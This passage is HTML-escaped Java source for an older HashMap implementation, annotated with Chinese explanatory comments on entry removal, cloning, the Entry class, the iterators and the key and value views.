        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(o &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; Map.Entry))  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
 
        Map.Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; entry = (Map.Entry&amp;lt;K,V&amp;gt;&lt;span&gt;) o;  
        Object key &lt;/span&gt;=&lt;span&gt; entry.getKey();  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hash = (key == &lt;span&gt;null&lt;/span&gt;) ? 0&lt;span&gt; : hash(key.hashCode());  
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(hash, table.length);  
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; prev =&lt;span&gt; table[i];  
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; prev;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除链表中的“键值对e”  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 本质是“删除单向链表中的节点”  &lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (e != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
            Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; next =&lt;span&gt; e.next;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp;&lt;span&gt; e.equals(entry)) {  
                modCount&lt;/span&gt;++&lt;span&gt;;  
                size&lt;/span&gt;--&lt;span&gt;;  
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (prev ==&lt;span&gt; e)  
                    table[i] &lt;/span&gt;=&lt;span&gt; next;  
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; 
                    prev.next &lt;/span&gt;=&lt;span&gt; next;  
                e.recordRemoval(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
            }  
            prev &lt;/span&gt;=&lt;span&gt; e;  
            e &lt;/span&gt;=&lt;span&gt; next;  
        }  
 
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 清空HashMap，将所有的元素设为null  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {  
        modCount&lt;/span&gt;++&lt;span&gt;;  
        Entry[] tab &lt;/span&gt;=&lt;span&gt; table;  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; tab.length; i++&lt;span&gt;)  
            tab[i] &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        size &lt;/span&gt;= 0&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 是否包含“值为value”的元素  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(Object value) {  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“value为null”，则调用containsNullValue()查找  &lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; containsNullValue();  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“value不为null”，则查找HashMap中是否有值为value的节点。  &lt;/span&gt;
    Entry[] tab =&lt;span&gt; table;  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; tab.length ; i++&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry e = tab[i] ; e != &lt;span&gt;null&lt;/span&gt; ; e =&lt;span&gt; e.next)  
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (value.equals(e.value))  
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;  
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 是否包含null值  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsNullValue() {  
    Entry[] tab &lt;/span&gt;=&lt;span&gt; table;  
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; tab.length ; i++&lt;span&gt;)  
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry e = tab[i] ; e != &lt;span&gt;null&lt;/span&gt; ; e =&lt;span&gt; e.next)  
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;  
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 克隆一个HashMap，并返回Object对象  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object clone() {  
        HashMap&lt;/span&gt;&amp;lt;K,V&amp;gt; result = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {  
            result &lt;/span&gt;= (HashMap&amp;lt;K,V&amp;gt;)&lt;span&gt;super&lt;/span&gt;&lt;span&gt;.clone();  
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (CloneNotSupportedException e) {  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; assert false;  &lt;/span&gt;
&lt;span&gt;        }  
        result.table &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[table.length];  
        result.entrySet &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        result.modCount &lt;/span&gt;= 0&lt;span&gt;;  
        result.size &lt;/span&gt;= 0&lt;span&gt;;  
        result.init();  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用putAllForCreate()将全部元素添加到HashMap中  &lt;/span&gt;
        result.putAllForCreate(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);  
 
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Entry是单向链表。  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 它是 “HashMap链式存储法”对应的链表。  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 它实现了Map.Entry 接口，即实现getKey(), getValue(), setValue(V value), equals(Object o), hashCode()这些函数  &lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Entry&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map.Entry&amp;lt;K,V&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; K key;  
        V value;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 指向下一个节点  &lt;/span&gt;
        Entry&amp;lt;K,V&amp;gt;&lt;span&gt; next;  
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hash;  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 构造函数。  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输入参数包括&quot;哈希值(h)&quot;, &quot;键(k)&quot;, &quot;值(v)&quot;, &quot;下一节点(n)&quot;  &lt;/span&gt;
        Entry(&lt;span&gt;int&lt;/span&gt; h, K k, V v, Entry&amp;lt;K,V&amp;gt;&lt;span&gt; n) {  
            value &lt;/span&gt;=&lt;span&gt; v;  
            next &lt;/span&gt;=&lt;span&gt; n;  
            key &lt;/span&gt;=&lt;span&gt; k;  
            hash &lt;/span&gt;=&lt;span&gt; h;  
        }  
 
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; K getKey() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; key;  
        }  
 
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; V getValue() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;  
        }  
 
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; V setValue(V newValue) {  
            V oldValue &lt;/span&gt;=&lt;span&gt; value;  
            value &lt;/span&gt;=&lt;span&gt; newValue;  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断两个Entry是否相等  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若两个Entry的“key”和“value”都相等，则返回true。  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 否则，返回false  &lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; equals(Object o) {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(o &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; Map.Entry))  
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;  
            Map.Entry e &lt;/span&gt;=&lt;span&gt; (Map.Entry)o;  
            Object k1 &lt;/span&gt;=&lt;span&gt; getKey();  
            Object k2 &lt;/span&gt;=&lt;span&gt; e.getKey();  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (k1 == k2 || (k1 != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; k1.equals(k2))) {  
                Object v1 &lt;/span&gt;=&lt;span&gt; getValue();  
                Object v2 &lt;/span&gt;=&lt;span&gt; e.getValue();  
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (v1 == v2 || (v1 != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; v1.equals(v2)))  
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;  
            }  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 实现hashCode()  &lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hashCode() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (key==&lt;span&gt;null&lt;/span&gt;   ? 0 : key.hashCode()) ^&lt;span&gt;  
                   (value&lt;/span&gt;==&lt;span&gt;null&lt;/span&gt; ? 0&lt;span&gt; : value.hashCode());  
        }  
 
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; String toString() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; getKey() + &quot;=&quot; +&lt;span&gt; getValue();  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当向HashMap中添加元素时，绘调用recordAccess()。  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这里不做任何处理  &lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; recordAccess(HashMap&amp;lt;K,V&amp;gt;&lt;span&gt; m) {  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当从HashMap中删除元素时，绘调用recordRemoval()。  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这里不做任何处理  &lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; recordRemoval(HashMap&amp;lt;K,V&amp;gt;&lt;span&gt; m) {  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 新增Entry。将“key-value”插入指定位置，bucketIndex是位置索引。  &lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt; addEntry(&lt;span&gt;int&lt;/span&gt; hash, K key, V value, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; bucketIndex) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 保存“bucketIndex”位置的值到“e”中  &lt;/span&gt;
        Entry&amp;lt;K,V&amp;gt; e =&lt;span&gt; table[bucketIndex];  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“bucketIndex”位置的元素为“新Entry”，  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“e”为“新Entry的下一个节点”  &lt;/span&gt;
        table[bucketIndex] = &lt;span&gt;new&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt;(hash, key, value, e);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若HashMap的实际大小 不小于 “阈值”，则调整HashMap的大小  &lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (size++ &amp;gt;=&lt;span&gt; threshold)  
            resize(&lt;/span&gt;2 *&lt;span&gt; table.length);  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建Entry。将“key-value”插入指定位置。  &lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt; createEntry(&lt;span&gt;int&lt;/span&gt; hash, K key, V value, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; bucketIndex) {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 保存“bucketIndex”位置的值到“e”中  &lt;/span&gt;
        Entry&amp;lt;K,V&amp;gt; e =&lt;span&gt; table[bucketIndex];  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“bucketIndex”位置的元素为“新Entry”，  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置“e”为“新Entry的下一个节点”  &lt;/span&gt;
        table[bucketIndex] = &lt;span&gt;new&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt;(hash, key, value, e);  
        size&lt;/span&gt;++&lt;span&gt;;  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashIterator是HashMap迭代器的抽象出来的父类，实现了公共了函数。  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 它包含“key迭代器(KeyIterator)”、“Value迭代器(ValueIterator)”和“Entry迭代器(EntryIterator)”3个子类。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; HashIterator&amp;lt;E&amp;gt; &lt;span&gt;implements&lt;/span&gt; Iterator&amp;lt;E&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 下一个元素  &lt;/span&gt;
        Entry&amp;lt;K,V&amp;gt;&lt;span&gt; next;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; expectedModCount用于实现fast-fail机制。  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt;&lt;span&gt; expectedModCount;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当前索引  &lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt;&lt;span&gt; index;  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当前元素  &lt;/span&gt;
        Entry&amp;lt;K,V&amp;gt;&lt;span&gt; current;  
 
        HashIterator() {  
            expectedModCount &lt;/span&gt;=&lt;span&gt; modCount;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (size &amp;gt; 0) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; advance to first entry  &lt;/span&gt;
                Entry[] t =&lt;span&gt; table;  
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将next指向table中第一个不为null的元素。  
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这里利用了index的初始值为0，从0开始依次向后遍历，直到找到不为null的元素就退出循环。  &lt;/span&gt;
                &lt;span&gt;while&lt;/span&gt; (index &amp;lt; t.length &amp;amp;&amp;amp; (next = t[index++]) == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                    ;  
            }  
        }  
 
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasNext() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; next != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取下一个元素  &lt;/span&gt;
        &lt;span&gt;final&lt;/span&gt; Entry&amp;lt;K,V&amp;gt;&lt;span&gt; nextEntry() {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (modCount !=&lt;span&gt; expectedModCount)  
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConcurrentModificationException();  
            Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; next;  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NoSuchElementException();  
 
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 注意！！！  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 一个Entry就是一个单向链表  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若该Entry的下一个节点不为空，就将next指向下一个节点;  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 否则，将next指向下一个链表(也是下一个Entry)的不为null的节点。  &lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((next = e.next) == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {  
                Entry[] t &lt;/span&gt;=&lt;span&gt; table;  
                &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (index &amp;lt; t.length &amp;amp;&amp;amp; (next = t[index++]) == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                    ;  
            }  
            current &lt;/span&gt;=&lt;span&gt; e;  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;  
        }  
 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除当前元素  &lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove() {  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (current == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)  
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalStateException();  
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (modCount !=&lt;span&gt; expectedModCount)  
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConcurrentModificationException();  
            Object k &lt;/span&gt;=&lt;span&gt; current.key;  
            current &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
            HashMap.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.removeEntryForKey(k);  
            expectedModCount &lt;/span&gt;=&lt;span&gt; modCount;  
        }  
 
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; value的迭代器  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ValueIterator &lt;span&gt;extends&lt;/span&gt; HashIterator&amp;lt;V&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V next() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; nextEntry().value;  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; key的迭代器  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; KeyIterator &lt;span&gt;extends&lt;/span&gt; HashIterator&amp;lt;K&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; K next() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; nextEntry().getKey();  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Entry的迭代器  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntryIterator &lt;span&gt;extends&lt;/span&gt; HashIterator&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Map.Entry&amp;lt;K,V&amp;gt;&lt;span&gt; next() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; nextEntry();  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回一个“key迭代器”  &lt;/span&gt;
    Iterator&amp;lt;K&amp;gt;&lt;span&gt; newKeyIterator()   {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; KeyIterator();  
    }  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回一个“value迭代器”  &lt;/span&gt;
    Iterator&amp;lt;V&amp;gt;&lt;span&gt; newValueIterator()   {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ValueIterator();  
    }  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回一个“entry迭代器”  &lt;/span&gt;
    Iterator&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; newEntryIterator()   {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EntryIterator();  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; HashMap的Entry对应的集合  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;transient&lt;/span&gt; Set&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt; entrySet = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“key的集合”，实际上返回一个“KeySet对象”  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Set&amp;lt;K&amp;gt;&lt;span&gt; keySet() {  
        Set&lt;/span&gt;&amp;lt;K&amp;gt; ks =&lt;span&gt; keySet;  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (ks != &lt;span&gt;null&lt;/span&gt; ? ks : (keySet = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; KeySet()));  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Key对应的集合  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; KeySet继承于AbstractSet，说明该集合中没有重复的Key。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; KeySet &lt;span&gt;extends&lt;/span&gt; AbstractSet&amp;lt;K&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Iterator&amp;lt;K&amp;gt;&lt;span&gt; iterator() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; newKeyIterator();  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; size;  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; contains(Object o) {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; containsKey(o);  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; remove(Object o) {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HashMap.&lt;span&gt;this&lt;/span&gt;.removeEntryForKey(o) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {  
            HashMap.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.clear();  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“value集合”，实际上返回的是一个Values对象  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Collection&amp;lt;V&amp;gt;&lt;span&gt; values() {  
        Collection&lt;/span&gt;&amp;lt;V&amp;gt; vs =&lt;span&gt; values;  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (vs != &lt;span&gt;null&lt;/span&gt; ? vs : (values = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Values()));  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; “value集合”  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Values继承于AbstractCollection，不同于“KeySet继承于AbstractSet”，  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Values中的元素能够重复。因为不同的key可以指向相同的value。  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Values &lt;span&gt;extends&lt;/span&gt; AbstractCollection&amp;lt;V&amp;gt;&lt;span&gt; {  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Iterator&amp;lt;V&amp;gt;&lt;span&gt; iterator() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; newValueIterator();  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; size;  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; contains(Object o) {  
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; containsValue(o);  
        }  
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {  
            HashMap.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.clear();  
        }  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“HashMap的Entry集合”  &lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Set&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; entrySet() {  
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; entrySet0();  
    }  
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回“HashMap的Entry集合”，它实际是返回一个EntrySet对象  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; Set&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; entrySet0() {  
        Set&lt;/span&gt;&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt; es =&lt;span&gt; entrySet;  
